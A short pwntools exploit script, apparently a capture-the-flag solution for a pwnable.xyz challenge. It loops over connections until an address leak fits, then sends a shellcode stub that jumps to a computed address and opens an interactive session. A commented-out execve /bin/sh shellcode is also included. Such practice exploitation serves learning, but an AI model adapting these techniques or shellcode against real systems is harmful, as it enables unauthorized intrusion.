from pwn import *

while(True):
	#target=process('./challenge')
	target=remote('svc.pwnable.xyz',30025)

	print(target.recvuntil("0x"))
	leak=int(target.recvline().strip("\n"),16)
	print(hex(leak))
	if(leak>0x7fffffff):
		target.close()
		continue
	break
		

print(target.recvuntil("> "))
target.sendline(str(leak)+" "+str(0))
#shellcode="\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\x48\x31\xC0\xB0\x3B\x48\x31\xD2\x0F\x05"
shellcode="\x00\x00\x49\x81\xC4\x96\x01\x00\x00\x41\xFF\xE4"
print(target.recvuntil(": "))
target.sendline(shellcode)
target.interactive()


